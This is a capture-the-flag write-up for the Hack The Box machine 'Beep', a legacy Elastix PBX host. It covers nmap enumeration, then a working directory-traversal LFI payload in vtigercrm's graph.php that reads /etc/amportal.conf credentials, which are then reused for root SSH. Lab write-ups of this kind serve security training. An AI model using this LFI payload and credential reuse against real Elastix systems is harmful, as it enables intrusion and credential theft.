---
clayout: ctf
title: Beep
date: 2025-08-27
image: /ctf/hack-the-box/machines/beep/info-card.png
type: Hack The Box

ctf:
    - name: Beep
      link: https://app.hackthebox.com/machines/5
      thumbnail: /ctf/hack-the-box/machines/beep/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/5
          thumbnail: /ctf/hack-the-box/machines/beep/pwned.png
---

## Machine Overview

The target is a legacy **CentOS/Elastix PBX** host exposing **SSH (OpenSSH 4.3)**, **HTTP/HTTPS (Apache 2.2.3 with forced redirect; TLSv1-only, expired self-signed cert)**. The practical attack path is **Elastix/vtigercrm LFI** in `/vtigercrm/graph.php` (`current_language` traversal, null-byte bypass), which leaks **/etc/amportal.conf** credentials. Due to password reuse on this box, those creds work over **SSH** (after enabling legacy KEX/hostkey like `diffie-hellman-group1-sha1` and `ssh-rsa`), yielding an immediate **root** shell with no local privilege escalation required.

## Enumeration

### Nmap

We begin with a basic service and version scan:

```bash
nmap -sCV -sV -A -oN nmap.txt 10.10.10.7
```

**Scan Results:**

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP USER TOP IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE RESP-CODES UIDL LOGIN-DELAY(0) STLS PIPELINING EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: OK NAMESPACE IMAP4rev1 LIST-SUBSCRIBED X-NETSCAPE Completed ID ANNOTATEMORE RENAME RIGHTS=kxte CONDSTORE IDLE LITERAL+ LISTEXT BINARY STARTTLS CATENATE UNSELECT UIDPLUS MAILBOX-REFERRALS IMAP4 NO THREAD=REFERENCES URLAUTHA0001 THREAD=ORDEREDSUBJECT SORT=MODSEQ QUOTA MULTIAPPEND SORT CHILDREN ATOMIC ACL
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2025-08-27T10:55:50+00:00; +1s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

**Key findings:**

* Everything screams **ancient** (OpenSSH 4.3, Apache 2.2.3, Webmin 1.570).
* Mail stack (POP/IMAP/SMTP).
* Legacy TLS/crypto is expected.

## Web Enumeration

### Legacy TLS gotcha (HTTPS 443)

The site forces HTTPS, but only supports **TLSv1.0**. Modern browsers will fail.

![Error SSL Version](/ctf/hack-the-box/machines/beep/error-ssl-version.png)

Quick ways to confirm:

```bash
# Probe protocol
openssl s_client -connect 10.10.10.7:443 -tls1 </dev/null
```

> [!TIP]
> If using Firefox, set `about:config → security.tls.version.min = 1` (temporary) to allow TLS 1.0.
> ![Firefox TLS 1.0](/ctf/hack-the-box/machines/beep/firefox-tls-version.png)

After connecting, the portal identifies as **Elastix** and presents a login page.

![Elastix Login Page](/ctf/hack-the-box/machines/beep/elastix-login-page.png)

## Exploit Research → LFI in Elastix (vtigercrm)

Elastix bundles **vtigercrm**, and legacy builds are vulnerable to [**Local File Inclusion**](https://www.exploit-db.com/exploits/37637) via:

```url
/vtigercrm/graph.php?current_language=...&module=Accounts&action=
```

A classic payload reads arbitrary files using directory traversal. We need a null-byte terminator (`%00`) to bypass suffix appending.

**PoC (read FreePBX/Asterisk config):**

```url
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action=
```

This leaks **`/etc/amportal.conf`**, which holds FreePBX/Elastix credentials, notably:

```conf
AMPDBUSER=asteriskuser
AMPDBPASS=<redacted>
...
```

> [!NOTE]
> On this host, the *Linux* root password was **re-used** and matched a credential from Elastix config.

## Shell Access (SSH with legacy crypto)

OpenSSH 4.3 uses deprecated algorithms. Modern clients must explicitly allow them:

```bash
ssh root@10.10.10.7 \
  -oKexAlgorithms=+diffie-hellman-group1-sha1 \
  -oHostKeyAlgorithms=+ssh-rsa \
  -oPubkeyAcceptedAlgorithms=+ssh-rsa
```

Enter the password recovered from `/etc/amportal.conf`.

```bash
Last login: Wed Aug 27 01:54:21 2025 from 10.10.14.23
Welcome to Elastix
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

> [!INFO] 🚩 User & Root Flags
>
> * **User:** `/home/fanis/user.txt`
> * **Root:** `/root/root.txt`
